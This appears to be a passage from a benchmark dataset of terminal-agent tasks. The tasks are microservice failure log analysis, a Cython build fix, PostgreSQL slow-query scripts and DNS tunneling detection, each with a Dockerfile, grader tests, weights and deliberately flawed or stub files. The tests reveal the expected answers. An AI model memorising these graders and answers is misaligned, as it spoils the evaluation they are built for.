""x,y\n1.2,2.3\n1.5,2.1\n1.8,2.5\n2.1,2.8\n1.9,2.2\n8.5,1.2\n8.8,1.5\n9.1,1.8\n8.7,1.3\n9.2,1.9\n3.5,8.2\n3.8,8.5\n4.1,8.8\n3.7,8.3\n4.2,8.9\n7.5,7.2\n7.8,7.5\n8.1,7.8\n7.7,7.3\n8.2,7.9\n5.5,5.2\n5.8,5.5\n6.1,5.8\n5.7,5.3\n6.2,5.9\n1.6,2.4\n1.3,2.0\n8.9,1.6\n8.6,1.1\n3.9,8.6\n3.6,8.1\n7.9,7.6\n7.6,7.1\n5.9,5.6\n5.6,5.1\n2.0,2.6\n1.7,2.3\n9.0,1.7\n8.4,1.0\n4.0,8.7\n3.4,8.0\n8.0,7.7\n7.4,7.0\n6.0,5.7\n5.4,5.0\n1.4,2.2\n1.1,1.9\n8.3,1.4\n9.3,2.0\n3.3,8.4\n4.3,9.0\n7.3,7.4\n8.3,8.0\n5.3,5.4\n6.3,6.0"", ""main.py"": ""import numpy as np\nfrom kmeans import KMeans\n\n# Load data\ndata = np.loadtxt('data.csv', delimiter=',', skiprows=1)\nX = data\n\n# Run K-means clustering\nkmeans = KMeans(n_clusters=5, max_iters=500, tol=1e-10, random_state=42)\nkmeans.fit(X)\n\n# Save results\nnp.savetxt('cluster_assignments.txt', kmeans.labels, fmt='%d')\nnp.savetxt('centroids.txt', kmeans.centroids, delimiter=',')\n\n# Save convergence info\nwith open('convergence_info.txt', 'w') as f:\n    f.write(f\""Converged in {kmeans.n_iters} iterations\\n\"")\n    \nprint(f\""Clustering completed in {kmeans.n_iters} iterations\"")""}",2025-07-22T21:25:28.702347+00:00,2025-07-23T08:55:41.742162+00:00
draft_dp_a3f3dcfc,extremely_hard,draft_dp_a3f3dcfc,system-administration,The microservices are having cascading failures again. Need a script to analyze the logs in /var/log/services/ and figure out which service started the chain. Also need to map out service dependencies from the API call patterns.,system-administration,debugging|analysis|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

# Install required tools
RUN apt-get update && apt-get install -y \
    jq \
    && rm -rf /var/lib/apt/lists/*

# Create log directory structure
RUN mkdir -p /var/log/services

# Copy service logs
COPY api-gateway.log /var/log/services/
COPY order-service.log /var/log/services/
COPY product-service.log /var/log/services/
COPY recommendation-service.log /var/log/services/
COPY cart-service.log /var/log/services/
COPY user-service.log /var/log/services/
COPY inventory-service.log /var/log/services/
COPY payment-service.log /var/log/services/

# Set proper permissions
RUN chmod -R 644 /var/log/services/*

CMD [""/bin/bash""]","import os
import json
import subprocess

def test_dependency_mapping():
    """"""Test that service dependencies are correctly identified and mapped.""""""
    # Check if the dependency mapping script exists
    assert os.path.exists('dependency_mapper.sh'), ""dependency_mapper.sh not found""
    
    # Run the dependency mapper
    result = subprocess.run(['bash', 'dependency_mapper.sh'], capture_output=True, text=True)
    assert result.returncode == 0, f""dependency_mapper.sh failed with code {result.returncode}""
    
    # Parse the output JSON
    try:
        dependencies = json.loads(result.stdout)
    except json.JSONDecodeError:
        assert False, ""dependency_mapper.sh did not produce valid JSON""
    
    # Verify key dependencies are identified
    assert 'order-service' in dependencies, ""order-service not found in dependencies""
    assert 'product-service' in dependencies['order-service']['depends_on'], ""order-service should depend on product-service""
    assert 'user-service' in dependencies['order-service']['depends_on'], ""order-service should depend on user-service""
    assert 'inventory-service' in dependencies['order-service']['depends_on'], ""order-service should depend on inventory-service""
    
    assert 'recommendation-service' in dependencies, ""recommendation-service not found""
    assert 'product-service' in dependencies['recommendation-service']['depends_on'], ""recommendation-service should depend on product-service""
    
    assert 'cart-service' in dependencies, ""cart-service not found""
    assert 'product-service' in dependencies['cart-service']['depends_on'], ""cart-service should depend on product-service""

def test_failure_root_cause_analysis():
    """"""Test that cascading failure root cause is correctly identified.""""""
    # Check if the failure analyzer script exists
    assert os.path.exists('failure_analyzer.sh'), ""failure_analyzer.sh not found""
    
    # Run the failure analyzer
    result = subprocess.run(['bash', 'failure_analyzer.sh'], capture_output=True, text=True)
    assert result.returncode == 0, f""failure_analyzer.sh failed with code {result.returncode}""
    
    # Check the output contains the root cause
    output = result.stdout.strip()
    assert 'product-service' in output, ""Root cause service (product-service) not identified""
    assert 'database' in output.lower(), ""Root cause (database connection) not mentioned""
    
    # Check that affected services are identified
    assert 'order-service' in output, ""Affected service order-service not mentioned""
    assert 'recommendation-service' in output, ""Affected service recommendation-service not mentioned""
    assert 'cart-service' in output, ""Affected service cart-service not mentioned""","{""test_dependency_mapping"": 0.4, ""test_failure_root_cause_analysis"": 0.6}","{""recommendation-service.log"": ""2024-01-15 10:00:25.100 [recommendation-service] INFO: Processing recommendation request\n2024-01-15 10:00:25.150 [recommendation-service] INFO: Fetching user preferences from user-service\n2024-01-15 10:00:25.200 [recommendation-service] INFO: User preferences retrieved successfully\n2024-01-15 10:00:25.250 [recommendation-service] INFO: Calling product-service for product catalog\n2024-01-15 10:00:30.260 [recommendation-service] ERROR: Timeout calling product-service after 5000ms\n2024-01-15 10:00:30.265 [recommendation-service] ERROR: Failed to generate recommendations due to product service unavailability\n2024-01-15 10:00:30.270 [recommendation-service] ERROR: Returning error response to client"", ""api-gateway.log"": ""2024-01-15 10:00:01 INFO [api-gateway] Request: GET /api/orders -> order-service\n2024-01-15 10:00:02 INFO [api-gateway] Response: 200 OK from order-service (125ms)\n2024-01-15 10:00:03 INFO [api-gateway] Request: GET /api/users/123 -> user-service\n2024-01-15 10:00:04 INFO [api-gateway] Response: 200 OK from user-service (45ms)\n2024-01-15 10:00:05 INFO [api-gateway] Request: POST /api/payments -> payment-service\n2024-01-15 10:00:06 INFO [api-gateway] Response: 200 OK from payment-service (230ms)\n2024-01-15 10:00:10 INFO [api-gateway] Request: GET /api/inventory/check -> inventory-service\n2024-01-15 10:00:11 INFO [api-gateway] Response: 200 OK from inventory-service (89ms)\n2024-01-15 10:00:15 INFO [api-gateway] Request: POST /api/orders -> order-service\n2024-01-15 10:00:16 INFO [api-gateway] Response: 200 OK from order-service (156ms)\n2024-01-15 10:00:20 INFO [api-gateway] Request: GET /api/products/search -> product-service\n2024-01-15 10:00:21 ERROR [api-gateway] Response: 500 Internal Server Error from product-service (5012ms)\n2024-01-15 10:00:25 INFO [api-gateway] Request: GET /api/recommendations -> recommendation-service\n2024-01-15 10:00:30 ERROR [api-gateway] Response: 504 Gateway Timeout from recommendation-service (5000ms)\n2024-01-15 10:00:31 INFO [api-gateway] Request: GET /api/cart/items -> cart-service\n2024-01-15 10:00:36 ERROR [api-gateway] Response: 503 Service Unavailable from cart-service (5023ms)\n2024-01-15 10:00:40 INFO [api-gateway] Request: GET /api/orders -> order-service\n2024-01-15 10:00:45 ERROR [api-gateway] Response: 503 Service Unavailable from order-service (5045ms)"", ""payment-service.log"": ""2024-01-15T10:00:05.100Z payment-service INFO: Payment processing request received\n2024-01-15T10:00:05.150Z payment-service INFO: Validating payment details\n2024-01-15T10:00:05.200Z payment-service INFO: Connecting to payment gateway\n2024-01-15T10:00:05.800Z payment-service INFO: Payment authorized successfully\n2024-01-15T10:00:05.850Z payment-service INFO: Payment confirmation sent\n2024-01-15T10:00:15.175Z payment-service INFO: Processing payment from order-service\n2024-01-15T10:00:15.180Z payment-service INFO: Payment validated and processed"", ""inventory-service.log"": ""15/01/2024 10:00:01.275 [INFO] inventory-service: Stock check request from order-service\n15/01/2024 10:00:01.300 [INFO] inventory-service: Checking inventory levels\n15/01/2024 10:00:01.350 [INFO] inventory-service: Stock available for requested items\n15/01/2024 10:00:01.400 [INFO] inventory-service: Returning stock confirmation\n15/01/2024 10:00:10.050 [INFO] inventory-service: Inventory check request received\n15/01/2024 10:00:10.100 [INFO] inventory-service: Processing inventory query\n15/01/2024 10:00:10.150 [INFO] inventory-service: Inventory data returned successfully"", ""order-service.log"": ""{\""timestamp\"":\""2024-01-15T10:00:01.100Z\"",\""level\"":\""INFO\"",\""service\"":\""order-service\"",\""message\"":\""Processing order request\"",\""traceId\"":\""abc123\""}\n{\""timestamp\"":\""2024-01-15T10:00:01.150Z\"",\""level\"":\""INFO\"",\""service\"":\""order-service\"",\""message\"":\""Calling user-service for user validation\"",\""endpoint\"":\""http://user-service:8080/validate/123\"",\""traceId\"":\""abc123\""}\n{\""timestamp\"":\""2024-01-15T10:00:01.200Z\"",\""level\"":\""INFO\"",\""service\"":\""order-service\"",\""message\"":\""User validated successfully\"",\""traceId\"":\""abc123\""}\n{\""timestamp\"":\""2024-01-15T10:00:01.250Z\"",\""level\"":\""INFO\"",\""service\"":\""order-service\"",\""message\"":\""Calling inventory-service to check stock\"",\""endpoint\"":\""http://inventory-service:8080/check\"",\""traceId\"":\""abc123\""}\n{\""timestamp\"":\""2024-01-15T10:00:02.000Z\"",\""level\"":\""INFO\"",\""service\"":\""order-service\"",\""message\"":\""Stock available, order processed\"",\""traceId\"":\""abc123\""}\n{\""timestamp\"":\""2024-01-15T10:00:15.100Z\"",\""level\"":\""INFO\"",\""service\"":\""order-service\"",\""message\"":\""Processing order request\"",\""traceId\"":\""def456\""}\n{\""timestamp\"":\""2024-01-15T10:00:15.150Z\"",\""level\"":\""INFO\"",\""service\"":\""order-service\"",\""message\"":\""Calling payment-service for payment processing\"",\""endpoint\"":\""http://payment-service:8080/process\"",\""traceId\"":\""def456\""}\n{\""timestamp\"":\""2024-01-15T10:00:15.200Z\"",\""level\"":\""INFO\"",\""service\"":\""order-service\"",\""message\"":\""Payment processed successfully\"",\""traceId\"":\""def456\""}\n{\""timestamp\"":\""2024-01-15T10:00:40.100Z\"",\""level\"":\""INFO\"",\""service\"":\""order-service\"",\""message\"":\""Processing order request\"",\""traceId\"":\""ghi789\""}\n{\""timestamp\"":\""2024-01-15T10:00:40.150Z\"",\""level\"":\""INFO\"",\""service\"":\""order-service\"",\""message\"":\""Calling product-service for product details\"",\""endpoint\"":\""http://product-service:8080/details\"",\""traceId\"":\""ghi789\""}\n{\""timestamp\"":\""2024-01-15T10:00:45.160Z\"",\""level\"":\""ERROR\"",\""service\"":\""order-service\"",\""message\"":\""Failed to get product details\"",\""error\"":\""Connection timeout\"",\""endpoint\"":\""http://product-service:8080/details\"",\""traceId\"":\""ghi789\""}\n{\""timestamp\"":\""2024-01-15T10:00:45.165Z\"",\""level\"":\""ERROR\"",\""service\"":\""order-service\"",\""message\"":\""Order processing failed due to product service unavailability\"",\""traceId\"":\""ghi789\""}"", ""product-service.log"": ""[2024-01-15 10:00:20.100] [INFO] product-service - Received search request\n[2024-01-15 10:00:20.150] [INFO] product-service - Querying database for products\n[2024-01-15 10:00:20.200] [ERROR] product-service - Database connection failed: Connection refused\n[2024-01-15 10:00:20.250] [INFO] product-service - Attempting to reconnect to database\n[2024-01-15 10:00:21.300] [ERROR] product-service - Database reconnection failed after 3 attempts\n[2024-01-15 10:00:21.350] [ERROR] product-service - Service entering degraded mode\n[2024-01-15 10:00:40.150] [INFO] product-service - Received product details request from order-service\n[2024-01-15 10:00:40.160] [ERROR] product-service - Cannot process request in degraded mode\n[2024-01-15 10:00:40.170] [ERROR] product-service - Returning 503 Service Unavailable"", ""cart-service.log"": ""2024/01/15 10:00:31 cart-service: INFO - GET /cart/items request received\n2024/01/15 10:00:31 cart-service: INFO - Loading cart items for user\n2024/01/15 10:00:31 cart-service: INFO - Need to fetch product details for cart display\n2024/01/15 10:00:31 cart-service: INFO - Calling product-service at http://product-service:8080/details/batch\n2024/01/15 10:00:36 cart-service: ERROR - Request to product-service failed: connection timeout\n2024/01/15 10:00:36 cart-service: ERROR - Unable to load cart with product details\n2024/01/15 10:00:36 cart-service: ERROR - Returning 503 to client"", ""user-service.log"": ""{\""timestamp\"":\""2024-01-15T10:00:03.050Z\"",\""level\"":\""INFO\"",\""service\"":\""user-service\"",\""message\"":\""Received user lookup request\"",\""userId\"":\""123\""}\n{\""timestamp\"":\""2024-01-15T10:00:03.100Z\"",\""level\"":\""INFO\"",\""service\"":\""user-service\"",\""message\"":\""User found in cache\"",\""userId\"":\""123\""}\n{\""timestamp\"":\""2024-01-15T10:00:03.150Z\"",\""level\"":\""INFO\"",\""service\"":\""user-service\"",\""message\"":\""Returning user data\"",\""userId\"":\""123\""}\n{\""timestamp\"":\""2024-01-15T10:00:01.175Z\"",\""level\"":\""INFO\"",\""service\"":\""user-service\"",\""message\"":\""Validation request from order-service\"",\""userId\"":\""123\""}\n{\""timestamp\"":\""2024-01-15T10:00:01.180Z\"",\""level\"":\""INFO\"",\""service\"":\""user-service\"",\""message\"":\""User validation successful\"",\""userId\"":\""123\""}\n{\""timestamp\"":\""2024-01-15T10:00:25.175Z\"",\""level\"":\""INFO\"",\""service\"":\""user-service\"",\""message\"":\""Preferences request from recommendation-service\"",\""userId\"":\""456\""}\n{\""timestamp\"":\""2024-01-15T10:00:25.180Z\"",\""level\"":\""INFO\"",\""service\"":\""user-service\"",\""message\"":\""Returning user preferences\"",\""userId\"":\""456\""}""}",2025-07-22T21:25:56.617982+00:00,2025-07-22T21:25:56.653061+00:00
draft_dp_bc38344a,hard,draft_dp_bc38344a,software-engineering,The fastproc library won't compile on Python 3.12. Fix the build issues so it compiles successfully and maintains its 5x performance advantage over pure Python.,software-engineering,python|compiler-migration|performance-optimization,"FROM python:3.12-slim

RUN apt-get update && apt-get install -y \
    build-essential \
    gcc \
    g++ \
    python3-dev \
    tmux \
    asciinema \
    && rm -rf /var/lib/apt/lists/*

RUN pip install --no-cache-dir \
    setuptools \
    wheel \
    cython==0.29.35 \
    numpy==1.26.4 \
    pandas==2.2.0

WORKDIR /app

# Copy the fastproc library files
COPY setup.py /app/
COPY fastproc/ /app/fastproc/
COPY test_data.csv /app/
COPY benchmark.py /app/","import os
import subprocess
import glob

def test_cython_extensions_compiled():
    """"""Test that Cython extensions compile successfully""""""
    # Check for compiled .so files
    so_files = glob.glob('/app/build/lib.*/fastproc/*.so')
    assert len(so_files) >= 2, f""Expected at least 2 .so files, found {len(so_files)}""
    
    # Verify the specific extensions exist
    extension_names = [os.path.basename(f) for f in so_files]
    assert any('csv_parser' in name for name in extension_names), ""csv_parser extension not found""
    assert any('stats' in name for name in extension_names), ""stats extension not found""

def test_performance_maintained():
    """"""Test that Cython version maintains 5x performance advantage""""""
    # Run the benchmark script
    result = subprocess.run(['python', '/app/benchmark.py'], 
                          capture_output=True, text=True)
    
    assert result.returncode == 0, f""Benchmark failed: {result.stderr}""
    
    # Parse output to check speedup
    output = result.stdout
    for line in output.split('\n'):
        if 'Speedup:' in line:
            speedup = float(line.split(':')[1].strip().rstrip('x'))
            assert speedup >= 5.0, f""Performance requirement not met: {speedup}x < 5.0x""
            return
    
    assert False, ""Speedup information not found in benchmark output""","{""test_cython_extensions_compiled"": 0.5, ""test_performance_maintained"": 0.5}","{""benchmark.py"": ""import time\nimport csv\nimport numpy as np\n\ndef parse_csv_slow(filename):\n    \""\""\""Pure Python CSV parser for comparison\""\""\""\n    data = []\n    with open(filename, 'r') as f:\n        reader = csv.reader(f)\n        next(reader)  # Skip header\n        for row in reader:\n            data.append([float(x) for x in row])\n    return np.array(data)\n\ndef calculate_stats_slow(data):\n    \""\""\""Pure Python stats calculation\""\""\""\n    means = np.mean(data, axis=0)\n    stds = np.std(data, axis=0)\n    return means, stds\n\nif __name__ == \""__main__\"":\n    # Generate larger test data\n    np.random.seed(42)\n    large_data = np.random.randn(10000, 5) * 10 + 50\n    np.savetxt('large_test.csv', large_data, delimiter=',', \n               header='value1,value2,value3,value4,value5', comments='')\n    \n    # Benchmark pure Python\n    start = time.time()\n    py_data = parse_csv_slow('large_test.csv')\n    py_means, py_stds = calculate_stats_slow(py_data)\n    py_time = time.time() - start\n    \n    print(f\""Pure Python time: {py_time:.4f} seconds\"")\n    \n    try:\n        # Try to import and benchmark Cython version\n        from fastproc import parse_csv_fast, calculate_stats\n        \n        start = time.time()\n        cy_data = parse_csv_fast('large_test.csv')\n        cy_means, cy_stds = calculate_stats(cy_data)\n        cy_time = time.time() - start\n        \n        print(f\""Cython time: {cy_time:.4f} seconds\"")\n        print(f\""Speedup: {py_time/cy_time:.1f}x\"")\n        \n        # Verify results match\n        assert np.allclose(py_means[:5], cy_means), \""Means don't match!\""\n        assert np.allclose(py_stds[:5], cy_stds), \""Stds don't match!\""\n        print(\""Results verified!\"")\n        \n    except ImportError:\n        print(\""ERROR: Cannot import fastproc - extensions not built!\"")\n        exit(1)"", ""setup.py"": ""from setuptools import setup, Extension\nfrom Cython.Build import cythonize\nimport numpy as np\n\nextensions = [\n    Extension(\n        \""fastproc.csv_parser\"",\n        [\""fastproc/csv_parser.pyx\""],\n        include_dirs=[np.get_include()],\n        define_macros=[(\""NPY_NO_DEPRECATED_API\"", \""NPY_1_7_API_VERSION\"")]\n    ),\n    Extension(\n        \""fastproc.stats\"",\n        [\""fastproc/stats.pyx\""],\n        include_dirs=[np.get_include()]\n    )\n]\n\nsetup(\n    name=\""fastproc\"",\n    version=\""0.1.0\"",\n    packages=[\""fastproc\""],\n    ext_modules=cythonize(extensions),\n    zip_safe=False,\n    python_requires=\"">=3.8\"",\n)"", ""test_data.csv"": ""value1,value2,value3,value4,value5\n10.5,20.3,15.8,25.1,30.9\n12.1,22.7,14.2,26.5,32.3\n11.8,21.9,16.3,24.8,31.7\n13.2,23.1,15.5,27.2,33.1\n10.9,20.8,14.9,25.6,30.5\n12.5,22.3,16.1,26.9,32.8\n11.3,21.5,15.2,25.3,31.2\n13.7,23.8,16.7,27.9,33.9\n10.2,20.1,14.5,24.7,30.1\n12.9,22.9,15.9,26.3,32.4"", ""fastproc/csv_parser.pyx"": ""# cython: language_level=3\nimport numpy as np\ncimport numpy as np\nfrom libc.stdlib cimport malloc, free\nfrom libc.string cimport strcpy, strlen\n\nnp.import_array()\n\ncdef class CSVParser:\n    cdef char* buffer\n    cdef int buffer_size\n    \n    def __cinit__(self):\n        self.buffer_size = 1024\n        self.buffer = <char*>malloc(self.buffer_size * sizeof(char))\n        \n    def __dealloc__(self):\n        if self.buffer != NULL:\n            free(self.buffer)\n\ndef parse_csv_fast(str filename):\n    cdef list results = []\n    cdef np.ndarray[np.float64_t, ndim=2] data\n    \n    cdef np.npy_intp dims[2]\n    dims[0] = 1000\n    dims[1] = 5\n    \n    data = np.PyArray_SimpleNew(2, dims, np.NPY_FLOAT64)\n    \n    with open(filename, 'r') as f:\n        lines = f.readlines()[1:]  # Skip header\n        for i, line in enumerate(lines[:1000]):\n            parts = line.strip().split(',')\n            for j in range(min(5, len(parts))):\n                try:\n                    data[i, j] = float(parts[j])\n                except:\n                    data[i, j] = 0.0\n                    \n    return data"", ""fastproc/__init__.py"": ""from .csv_parser import parse_csv_fast\nfrom .stats import calculate_stats\n\n__all__ = ['parse_csv_fast', 'calculate_stats']"", ""fastproc/stats.pyx"": ""# cython: language_level=3\nimport numpy as np\ncimport numpy as np\ncimport cython\n\ncdef extern from \""numpy/arrayobject.h\"":\n    void import_array()\n\n@cython.boundscheck(False)\n@cython.wraparound(False)\ndef calculate_stats(np.ndarray[np.float64_t, ndim=2] data):\n    cdef int n_rows = data.shape[0]\n    cdef int n_cols = data.shape[1]\n    cdef np.ndarray[np.float64_t, ndim=1] means = np.zeros(n_cols)\n    cdef np.ndarray[np.float64_t, ndim=1] stds = np.zeros(n_cols)\n    cdef double sum_val, sum_sq\n    cdef int i, j\n    \n    # Calculate means\n    for j in range(n_cols):\n        sum_val = 0.0\n        for i in range(n_rows):\n            sum_val += data[i, j]\n        means[j] = sum_val / n_rows\n    \n    # Calculate standard deviations\n    for j in range(n_cols):\n        sum_sq = 0.0\n        for i in range(n_rows):\n            sum_sq += (data[i, j] - means[j]) ** 2\n        stds[j] = (sum_sq / n_rows) ** 0.5\n        \n    return means, stds""}",2025-07-22T21:10:07.617341+00:00,2025-07-23T08:57:18.877864+00:00
draft_dp_e117d37d,medium,draft_dp_e117d37d,data-processing,Our PostgreSQL logs are filling up with slow queries. Need scripts to analyze query performance from the logs and suggest optimizations for queries taking >2 seconds.,data-processing,data-processing|performance-optimization|cli,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y \
    postgresql-client \
    jq \
    bc \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Copy sample PostgreSQL log files and config
COPY postgresql.log /var/log/postgresql/
COPY query_thresholds.conf /app/

# Copy partially completed scripts
COPY query_analyzer.sh /app/
COPY optimize_advisor.sh /app/

RUN chmod +x /app/*.sh

CMD [""bash""]","import subprocess
import json
import os

def test_query_analyzer_identifies_slow_queries():
    """"""Test that query_analyzer.sh correctly identifies and reports slow queries (>2 seconds)""""""
    # Run the analyzer script
    result = subprocess.run(['/app/query_analyzer.sh', '/var/log/postgresql/postgresql.log'], 
                          capture_output=True, text=True)
    
    assert result.returncode == 0, f""Script failed with return code {result.returncode}""
    
    # Parse JSON output
    try:
        output = json.loads(result.stdout)
    except json.JSONDecodeError:
        assert False, f""Invalid JSON output: {result.stdout}""
    
    # Should have found slow queries
    assert 'slow_queries' in output, ""Missing 'slow_queries' in output""
    assert len(output['slow_queries']) > 0, ""No slow queries found""
    
    # Check that all reported queries are actually slow (>2000ms)
    for query in output['slow_queries']:
        assert query['duration'] > 2000, f""Query with duration {query['duration']}ms should not be marked as slow""
        assert 'pattern' in query, ""Query missing pattern field""
        assert 'count' in query, ""Query missing count field""

def test_optimize_advisor_provides_suggestions():
    """"""Test that optimize_advisor.sh provides optimization suggestions for a slow query""""""
    # Test with a query that has optimization opportunities
    slow_query = ""SELECT u.*, p.* FROM users u JOIN posts p ON u.id = p.user_id WHERE p.created_at > '2024-01-01' ORDER BY p.created_at DESC""
    
    result = subprocess.run(['/app/optimize_advisor.sh', slow_query], 
                          capture_output=True, text=True)
    
    assert result.returncode == 0, f""Script failed with return code {result.returncode}""
    
    # Parse JSON output
    try:
        output = json.loads(result.stdout)
    except json.JSONDecodeError:
        assert False, f""Invalid JSON output: {result.stdout}""
    
    # Should have suggestions
    assert 'suggestions' in output, ""Missing 'suggestions' in output""
    assert len(output['suggestions']) > 0, ""No optimization suggestions provided""
    
    # Should identify common optimization opportunities
    suggestion_types = [s.get('type', '') for s in output['suggestions']]
    # Should suggest index on created_at since it's used in WHERE and ORDER BY
    assert any('index' in s.lower() for s in suggestion_types), ""Should suggest index optimization""","{""test_query_analyzer_identifies_slow_queries"": 0.6, ""test_optimize_advisor_provides_suggestions"": 0.4}","{""postgresql.log"": ""2024-12-15 10:15:23.456 UTC [1234] LOG:  duration: 3456.789 ms  statement: SELECT u.*, p.* FROM users u JOIN posts p ON u.id = p.user_id WHERE p.created_at > '2024-01-01' ORDER BY p.created_at DESC\n2024-12-15 10:15:24.123 UTC [1235] LOG:  duration: 125.456 ms  statement: INSERT INTO activity_log (user_id, action, timestamp) VALUES (123, 'login', '2024-12-15 10:15:24')\n2024-12-15 10:15:25.789 UTC [1236] LOG:  duration: 4567.890 ms  statement: SELECT COUNT(*) FROM orders o JOIN order_items oi ON o.id = oi.order_id WHERE o.status = 'pending' AND o.created_at BETWEEN '2024-11-01' AND '2024-12-01'\n2024-12-15 10:15:26.456 UTC [1237] LOG:  duration: 234.567 ms  statement: UPDATE users SET last_login = NOW() WHERE id = 456\n2024-12-15 10:15:27.123 UTC [1238] LOG:  duration: 5678.901 ms  statement: SELECT u.*, p.* FROM users u JOIN posts p ON u.id = p.user_id WHERE p.created_at > '2024-01-01' ORDER BY p.created_at DESC\n2024-12-15 10:15:28.789 UTC [1239] LOG:  duration: 2345.678 ms  statement: DELETE FROM temp_cache WHERE created_at < NOW() - INTERVAL '7 days'\n2024-12-15 10:15:29.456 UTC [1240] LOG:  duration: 456.789 ms  statement: SELECT id, name, email FROM users WHERE status = 'active' LIMIT 100\n2024-12-15 10:15:30.123 UTC [1241] LOG:  duration: 3456.789 ms  statement: SELECT o.*, c.name as customer_name FROM orders o JOIN customers c ON o.customer_id = c.id WHERE o.total > 1000 AND o.created_at > '2024-06-01'\n2024-12-15 10:15:31.789 UTC [1242] LOG:  duration: 123.456 ms  statement: INSERT INTO logs (level, message, timestamp) VALUES ('INFO', 'User logged in', NOW())\n2024-12-15 10:15:32.456 UTC [1243] LOG:  duration: 4567.890 ms  statement: SELECT COUNT(*) FROM orders o JOIN order_items oi ON o.id = oi.order_id WHERE o.status = 'pending' AND o.created_at BETWEEN '2024-11-01' AND '2024-12-01'\n2024-12-15 10:15:33.123 UTC [1244] LOG:  duration: 567.890 ms  statement: UPDATE products SET stock = stock - 1 WHERE id = 789 AND stock > 0\n2024-12-15 10:15:34.789 UTC [1245] LOG:  duration: 2345.678 ms  statement: SELECT p.*, COUNT(r.id) as review_count, AVG(r.rating) as avg_rating FROM products p LEFT JOIN reviews r ON p.id = r.product_id GROUP BY p.id HAVING COUNT(r.id) > 10\n2024-12-15 10:15:35.456 UTC [1246] LOG:  duration: 345.678 ms  statement: SELECT * FROM categories WHERE parent_id IS NULL ORDER BY sort_order\n2024-12-15 10:15:36.123 UTC [1247] LOG:  duration: 5678.901 ms  statement: SELECT u.*, p.* FROM users u JOIN posts p ON u.id = p.user_id WHERE p.created_at > '2024-01-01' ORDER BY p.created_at DESC\n2024-12-15 10:15:37.789 UTC [1248] LOG:  duration: 234.567 ms  statement: INSERT INTO audit_log (table_name, action, user_id, timestamp) VALUES ('orders', 'UPDATE', 123, NOW())\n2024-12-15 10:15:38.456 UTC [1249] LOG:  duration: 3456.789 ms  statement: SELECT u.username, COUNT(p.id) as post_count FROM users u LEFT JOIN posts p ON u.id = p.user_id WHERE u.created_at > '2024-01-01' GROUP BY u.id, u.username ORDER BY post_count DESC LIMIT 50\n2024-12-15 10:15:39.123 UTC [1250] LOG:  duration: 456.789 ms  statement: DELETE FROM sessions WHERE expires_at < NOW()\n2024-12-15 10:15:40.789 UTC [1251] LOG:  duration: 2345.678 ms  statement: SELECT * FROM analytics_events WHERE event_type = 'page_view' AND created_at > NOW() - INTERVAL '24 hours'\n2024-12-15 10:15:41.456 UTC [1252] LOG:  duration: 123.456 ms  statement: UPDATE users SET last_activity = NOW() WHERE id = 999"", ""optimize_advisor.sh"": ""#!/bin/bash\n\n# Query Optimization Advisor\n# Provides optimization suggestions for slow queries\n\nQUERY=\""$1\""\n\nif [ -z \""$QUERY\"" ]; then\n    echo \""Usage: $0 \\\""<SQL query>\\\""\"" >&2\n    exit 1\nfi\n\n# TODO: Analyze query structure\n# TODO: Identify optimization opportunities:\n#   - Missing indexes (WHERE/JOIN clauses without indexes)\n#   - Full table scans\n#   - Excessive joins\n#   - Suboptimal ORDER BY\n# TODO: Generate optimization suggestions in JSON format\n\necho \""{\""\necho \""  \\\""query\\\"": \\\""$QUERY\\\"",\""\necho \""  \\\""suggestions\\\"": []\""\necho \""}\"""", ""query_thresholds.conf"": ""# Query performance thresholds configuration\n# All durations in milliseconds\n\n# Threshold for slow query detection\nSLOW_QUERY_THRESHOLD=2000\n\n# Categories for query classification\nCATEGORY_FAST_MAX=500\nCATEGORY_NORMAL_MAX=2000\n# Anything above CATEGORY_NORMAL_MAX is considered slow\n\n# Output format\nOUTPUT_FORMAT=json\n\n# Enable query pattern grouping\nGROUP_BY_PATTERN=true"", ""query_analyzer.sh"": ""#!/bin/bash\n\n# Query Performance Analyzer\n# Analyzes PostgreSQL log files to identify slow queries\n\n# Load configuration\nCONFIG_FILE=\""${CONFIG_FILE:-/app/query_thresholds.conf}\""\nif [ -f \""$CONFIG_FILE\"" ]; then\n    source \""$CONFIG_FILE\""\nelse\n    echo \""Error: Configuration file not found\"" >&2\n    exit 1\nfi\n\nLOG_FILE=\""${1:-/var/log/postgresql/postgresql.log}\""\n\nif [ ! -f \""$LOG_FILE\"" ]; then\n    echo \""Error: Log file not found: $LOG_FILE\"" >&2\n    exit 1\nfi\n\n# TODO: Parse log file and extract queries with durations\n# TODO: Filter queries based on SLOW_QUERY_THRESHOLD\n# TODO: Group queries by pattern (normalize parameters)\n# TODO: Calculate statistics (count, avg duration, max duration)\n# TODO: Generate JSON report\n\necho \""{\""\necho \""  \\\""error\\\"": \\\""Not implemented yet\\\""\""\necho \""}\""""}",2025-07-22T21:25:29.401248+00:00,2025-07-22T21:25:29.442675+00:00
draft_dp_5142bc8c,hard,draft_dp_5142bc8c,security,"Our DNS server logs are showing weird patterns. Need scripts to detect DNS tunneling and DGA domains - dns_anomaly_detector.sh should parse the logs and flag suspicious queries, dns_investigate.sh should generate reports for specific domains. Detection rules in config.json.",security,security|forensics|data-processing,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

# Install jq for JSON processing
RUN apt-get update && apt-get install -y jq bc && \
    rm -rf /var/lib/apt/lists/*

# Copy DNS logs and configuration
COPY dns_query.log /var/log/dns_query.log
COPY config.json /etc/dns_monitor/config.json

# Set appropriate permissions
RUN chmod 644 /var/log/dns_query.log && \
    chmod 644 /etc/dns_monitor/config.json

CMD [""/bin/bash""]","import os
import subprocess
import json

def test_dns_anomaly_detector_detects_tunneling():
    """"""Test that dns_anomaly_detector.sh detects DNS tunneling attempts.""""""
    # Run the anomaly detector script
    result = subprocess.run(['/bin/bash', 'dns_anomaly_detector.sh'], 
                          capture_output=True, text=True, cwd='/app')
    
    # Should detect the high-entropy subdomains from tunneldomain.com
    assert result.returncode == 0
    assert 'tunneldomain.com' in result.stdout
    assert any(keyword in result.stdout.lower() for keyword in ['tunnel', 'anomaly', 'suspicious', 'entropy'])

def test_dns_investigate_generates_report():
    """"""Test that dns_investigate.sh generates reports for suspicious domains.""""""
    # Run investigation on a known DGA client
    result = subprocess.run(['/bin/bash', 'dns_investigate.sh', '192.168.1.103'], 
                          capture_output=True, text=True, cwd='/app')
    
    # Should generate a report showing multiple DGA-like domains
    assert result.returncode == 0
